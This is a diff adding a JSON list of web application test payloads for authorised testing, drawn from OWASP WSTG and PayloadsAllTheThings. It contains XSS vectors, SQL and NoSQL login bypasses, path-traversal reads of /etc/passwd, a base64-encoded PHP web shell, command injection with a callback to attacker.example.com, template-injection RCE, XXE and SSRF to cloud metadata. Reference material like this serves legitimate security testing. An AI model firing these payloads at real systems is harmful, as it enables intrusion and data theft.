@@ -1,0 +1,225 @@
+{
+  "version": 1,
+  "updated": "2026-10-11",
+  "note": "Proof-of-concept detection vectors for authorized web application testing, from the OWASP WSTG and PayloadsAllTheThings. These confirm whether an input is handled unsafely; they are deliberately the detection level, not weaponised chains. Nothing here runs: the page hands you text to paste into your own test request.",
+  "groups": [
+    {
+      "id": "xss",
+      "name": "Cross-site scripting",
+      "wstg": "WSTG-INJT-01/02, WSTG-CLNT-01",
+      "intro": "Inject a marker that executes in the browser. Start with the plainest vector; move to the attribute-breaking and event-handler forms when output is filtered or encoded.",
+      "payloads": [
+        {
+          "text": "<script>alert(1)</script>",
+          "note": "The plainest reflected test. If this fires, output is unescaped in an HTML context."
+        },
+        {
+          "text": "\"><script>alert(1)</script>",
+          "note": "Breaks out of an attribute value first, then injects. For input reflected inside a tag attribute."
+        },
+        {
+          "text": "<img src=x onerror=alert(1)>",
+          "note": "No <script> needed. Gets past filters that strip script tags but allow img."
+        },
+        {
+          "text": "<svg onload=alert(1)>",
+          "note": "Shorter, and fires on load. Useful where img is filtered."
+        },
+        {
+          "text": "'-alert(1)-'",
+          "note": "For input reflected inside a JavaScript string. Closes the string and runs."
+        },
+        {
+          "text": "javascript:alert(1)",
+          "note": "For an href or src sink. Confirms a URL context that executes."
+        },
+        {
+          "text": "{{constructor.constructor('alert(1)')()}}",
+          "note": "Client-side template injection (WSTG-CLNT-15) in Angular-style templates."
+        },
+        {
+          "text": "<marquee onstart=alert(1)>",
+          "note": "An alternate event handler for filters that blocklist onerror/onload."
+        }
+      ]
+    },
+    {
+      "id": "sqli",
+      "name": "SQL injection",
+      "wstg": "WSTG-INJT-05",
+      "intro": "Confirm the input reaches a query unsanitised. A quote that errors, a boolean that changes the result, or a time delay that proves blind execution. Confirm by hand, then let sqlmap enumerate.",
+      "payloads": [
+        {
+          "text": "'",
+          "note": "A single quote. A database error or a changed response means the input is in the query."
+        },
+        {
+          "text": "' OR '1'='1",
+          "note": "The classic boolean test. On a login, may return the first row and authenticate."
+        },
+        {
+          "text": "' OR '1'='1' -- ",
+          "note": "Comments out the rest of the query. The trailing space after -- matters in MySQL."
+        },
+        {
+          "text": "admin'-- ",
+          "note": "Authenticate as a known user by commenting off the password check."
+        },
+        {
+          "text": "1' ORDER BY 1-- ",
+          "note": "Find the column count by incrementing until it errors. Needed before a UNION."
+        },
+        {
+          "text": "1' UNION SELECT NULL,NULL,NULL-- ",
+          "note": "Match the column count, then replace NULLs with data to extract."
+        },
+        {
+          "text": "1' AND SLEEP(5)-- ",
+          "note": "Blind, time-based. A 5-second delay confirms execution when there is no visible output."
+        },
+        {
+          "text": "1;WAITFOR DELAY '0:0:5'--",
+          "note": "The MSSQL time delay. SLEEP is MySQL; WAITFOR is SQL Server."
+        },
+        {
+          "text": "1' AND 1=CONVERT(int,@@version)-- ",
+          "note": "MSSQL error-based: forces the version into an error message."
+        }
+      ]
+    },
+    {
+      "id": "lfi",
+      "name": "Path traversal and file inclusion",
+      "wstg": "WSTG-ATHZ-01",
+      "intro": "A path parameter that escapes the intended directory. Read a known file to confirm, then reach application source, config and keys.",
+      "payloads": [
+        {
+          "text": "../../../../etc/passwd",
+          "note": "The canonical Linux test. root: in the response confirms traversal."
+        },
+        {
+          "text": "..\\..\\..\\..\\windows\\win.ini",
+          "note": "The Windows equivalent, with backslashes."
+        },
+        {
+          "text": "....//....//....//etc/passwd",
+          "note": "Bypasses a filter that strips a single ../ by not recursing."
+        },
+        {
+          "text": "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+          "note": "URL-encoded ../, for a filter that matches the literal dots and slash."
+        },
+        {
+          "text": "php://filter/convert.base64-encode/resource=index.php",
+          "note": "PHP wrapper: reads source as base64 instead of executing it."
+        },
+        {
+          "text": "/etc/passwd%00",
+          "note": "A null byte truncates an appended extension on old PHP (<5.3.4)."
+        },
+        {
+          "text": "/proc/self/environ",
+          "note": "Sometimes writable via the User-Agent, turning LFI into code execution."
+        },
+        {
+          "text": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+",
+          "note": "data:// wrapper carrying a base64 PHP payload, where allow_url_include is on.",
+          "warn": "That payload is a web shell. Only against a target you are scoped to test, and remove it after."
+        }
+      ]
+    },
+    {
+      "id": "cmdi",
+      "name": "Command injection",
+      "wstg": "WSTG-INJT-12",
+      "intro": "Where input reaches a shell. A separator plus a command you can observe — a delay or a DNS callback — confirms blind execution.",
+      "payloads": [
+        {
+          "text": "; id",
+          "note": "Semicolon ends the first command and runs yours. uid= in the output confirms it."
+        },
+        {
+          "text": "| id",
+          "note": "Pipes into your command. Works where the separator is filtered."
+        },
+        {
+          "text": "`id`",
+          "note": "Backtick command substitution, embedded in the original argument."
+        },
+        {
+          "text": "$(id)",
+          "note": "The modern substitution form, for shells that disable backticks."
+        },
+        {
+          "text": "; sleep 5",
+          "note": "Blind test: a 5-second delay proves execution with no visible output."
+        },
+        {
+          "text": "& ping -c 4 attacker.example.com",
+          "note": "Out-of-band: a DNS or ICMP callback confirms blind injection you cannot see in the response."
+        }
+      ]
+    },
+    {
+      "id": "ssti",
+      "name": "Server-side template injection",
+      "wstg": "WSTG — mapped under injection",
+      "intro": "Template engines that evaluate user input. The {{7*7}} probe returning 49 tells you which engine, and the engine tells you the path to code execution.",
+      "payloads": [
+        {
+          "text": "{{7*7}}",
+          "note": "The universal probe. 49 in the response means a template engine evaluated it (Jinja2, Twig, Freemarker)."
+        },
+        {
+          "text": "${7*7}",
+          "note": "The probe for Freemarker, Spring and Mako. 49 confirms."
+        },
+        {
+          "text": "<%= 7*7 %>",
+          "note": "The ERB (Ruby) probe."
+        },
+        {
+          "text": "{{7*'7'}}",
+          "note": "Distinguishes engines: 7777777 is Jinja2, 49 is Twig."
+        },
+        {
+          "text": "{{config}}",
+          "note": "Jinja2: dumps the Flask config, often including the secret key."
+        },
+        {
+          "text": "${T(java.lang.Runtime).getRuntime().exec('id')}",
+          "note": "Spring/Freemarker path to command execution.",
+          "warn": "This executes a command on the server. Scope it, and prefer the arithmetic probes to confirm first."
+        }
+      ]
+    },
+    {
+      "id": "other",
+      "name": "XXE, SSRF, CRLF, NoSQL",
+      "wstg": "WSTG — injection and client-side",
+      "intro": "The less common but high-impact injection classes, one confirming payload each.",
+      "payloads": [
+        {
+          "text": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>",
+          "note": "XXE: an external entity reading a local file. Send as an XML body where the app parses XML."
+        },
+        {
+          "text": "http://169.254.169.254/latest/meta-data/",
+          "note": "SSRF against the cloud metadata endpoint. Credentials live one path deeper on AWS."
+        },
+        {
+          "text": "%0d%0aSet-Cookie:%20test=1",
+          "note": "CRLF injection: splits the HTTP response to inject a header."
+        },
+        {
+          "text": "{\"$ne\":null}",
+          "note": "NoSQL: a MongoDB operator that matches any value. On a login, bypasses the password check."
+        },
+        {
+          "text": "admin' && this.password.match(/.*/)//",
+          "note": "NoSQL JavaScript injection, for a $where clause."
+        }
+      ]
+    }
+  ]
+}
